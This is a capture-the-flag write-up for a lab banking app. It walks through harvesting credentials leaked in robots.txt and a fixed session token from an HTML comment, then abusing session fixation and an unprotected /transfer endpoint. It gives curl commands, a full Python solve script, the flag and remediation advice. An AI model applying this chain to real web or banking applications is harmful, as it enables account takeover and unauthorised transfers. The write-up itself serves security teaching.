# The Trojan Ledger

## Overview

We were given a "banking app" on port 8082 with a login portal. The challenge hint:

> *"A small banking app with a spotless UI and a careless developer. Something was left behind in the wrong folder, and the way it hands out sessions has a fatal habit. Follow the paper trail, then move money that isn't yours."*

Three clues map cleanly onto three bugs: a **misplaced file** (robots.txt leaking credentials), a **session-fixation flaw** (a fixed, pre-assigned session token leaked in a debug comment), and a **CSRF**-able state-changing endpoint (`/transfer`) that only trusts that fixed token. The solve is a straight chain: read the paper trail → log in → move the "classified data".

---

## Recon

**`GET /`** returns an auth portal with two immediate tells in the HTML:

```html
<form method="POST" action="/">
    <input type="hidden" name="session_token" value="">
    <input type="text" name="username" placeholder="USERNAME">
    <input type="password" name="password" placeholder="PASSWORD">
    <button type="submit">AUTHENTICATE</button>
</form>
<!-- SYSTEM: session tokens are pre-assigned and must be presented at authentication -->
<!-- DEBUG LOG: last session token issued: ghost_fixed_token - handler 2025-01-15 -->
```

1. The comment **"session tokens are pre-assigned and must be presented at authentication"** is a textbook description of *session fixation* — the session ID is not generated/rotated at login; a value is decided beforehand and the client supplies it.
2. The **DEBUG LOG** leaks that fixed value: `ghost_fixed_token`.

**`GET /robots.txt`** — the "something left behind in the wrong folder":

```
User-agent: *
Disallow: /panel
# sumith:Lanka2026
```

Two more gifts: the hidden admin route **`/panel`**, and plaintext credentials **`sumith:Lanka2026`** left in a comment.

Endpoint map:

| Path | Method(s) | Result when unauthenticated |
|---|---|---|
| `/` | GET/POST | Auth form |
| `/panel` | GET | 302 → `/` (requires session) |
| `/transfer` | POST | `TRANSFER FAILED - INVALID SESSION` |

---

## Analysis

**Vulnerability 1 — hardcoded, fixated session token.**
The "session token" is the literal string `ghost_fixed_token`, leaked in an HTML comment. Logging in with `sumith:Lanka2026` plus `session_token=ghost_fixed_token` succeeds, and the server echoes the *same* token straight back into the response cookies:

```
Set-Cookie: session_token=ghost_fixed_token; Path=/
Set-Cookie: logged_in=sumith; Path=/
```

The token never changes and is identical for every client — the classic session-fixation "fatal habit" the hint refers to. (The `logged_in=sumith` cookie is set but, as I verified, `/transfer` ignores it — only the fixed `session_token` matters.)

**Vulnerability 2 — state-changing endpoint with no CSRF protection.**
`/panel` renders a form whose only action is a bare `<button>` POSTing to `/transfer`. There is no CSRF token, no origin check, no `SameSite` restriction — just a check that the `session_token` cookie equals the known fixed string. Because that token is a constant, any attacker (or any cross-site script) who knows it can invoke the transfer.

---

## Exploitation

### Step 1 — harvest the paper trail (`robots.txt` + the debug comment):

```bash
curl -s http://192.168.45.128:8082/robots.txt
# Disallow: /panel
# sumith:Lanka2026

curl -s http://192.168.45.128:8082/ | grep -i "session token"
# <!-- DEBUG LOG: last session token issued: ghost_fixed_token - handler 2025-01-15 -->
```

### Step 2 — authenticate with the leaked credentials + fixed token:

```bash
curl -s -i -X POST http://192.168.45.128:8082/ \
  --data "session_token=ghost_fixed_token&username=sumith&password=Lanka2026"
# 302 → /panel
# Set-Cookie: session_token=ghost_fixed_token; Path=/
# Set-Cookie: logged_in=sumith; Path=/
```

### Step 3 — enter the panel and trigger the transfer with the fixed session:

```bash
curl -s -b "session_token=ghost_fixed_token; logged_in=sumith" \
     http://192.168.45.128:8082/panel
# => HANDLER CONTROL PANEL  +  <form method="POST" action="/transfer">

curl -s -b "session_token=ghost_fixed_token; logged_in=sumith" \
     -X POST http://192.168.45.128:8082/transfer
```

```html
<h1>FILE W-02 RECOVERED</h1>
<p>FLAG: MAHASONA{csrf_session_fixed_handler_owned}</p>
```

### Complete solve script (stdlib only)

```python
# solve_trojan_ledger.py
import re, urllib.request, urllib.parse

TARGET = "http://192.168.45.128:8082"

# Step 1 — paper trail
robots = urllib.request.urlopen(TARGET + "/robots.txt").read().decode()
user, pwd = re.search(r"#\s*([^:]+):(\S+)", robots).groups()

index = urllib.request.urlopen(TARGET + "/").read().decode()
token = re.search(r"issued:\s*(\S+)", index).group(1)

# Step 2 — login (session fixation: present the fixed token)
urllib.request.urlopen(TARGET + "/", data=urllib.parse.urlencode({
    "session_token": token, "username": user, "password": pwd,
}).encode())

# Step 3 — transfer with the fixed session cookie (POST-only endpoint)
req = urllib.request.Request(TARGET + "/transfer", data=b"",
                             headers={"Cookie": f"session_token={token}"})
html = urllib.request.urlopen(req).read().decode()
print(re.search(r"MAHASONA\{[^}]+\}", html).group(0))
```

---

## The Flag

```
MAHASONA{csrf_session_fixed_handler_owned}
```

Found in the response body of `POST /transfer` when authenticated with the fixated `session_token=ghost_fixed_token`.

---

## Remediation

**1. Rotate the session ID at login.**
Never trust a client-supplied session token. Generate a fresh, random session ID on successful authentication and invalidate the pre-auth one. This kills session fixation outright.

**2. Don't leak secrets in robots.txt or HTML comments.**
Credentials (`sumith:Lanka2026`) sat in a `robots.txt` comment, and the session token sat in an HTML `DEBUG LOG` comment. Neither belongs in client-visible output. Move secrets to environment variables/server-side config, and strip debug comments from production.

**3. Add CSRF protection to state-changing endpoints.**
`/transfer` performs a privileged action with no CSRF token, no `Origin`/`Referer` validation, and no `SameSite` attribute on the cookie. Use a per-session CSRF token (or `SameSite=Lax/Strict` plus origin checks) so a forged request can't trigger the transfer.

**4. Enforce authorization server-side, not via a client cookie.**
The `logged_in` cookie is set but meaningless; authorization hinged entirely on a fixed, known string. Back the session with a server-side store (Flask `session` with a strong `SECRET_KEY`) and derive the identity from it, never from a client-editable value.
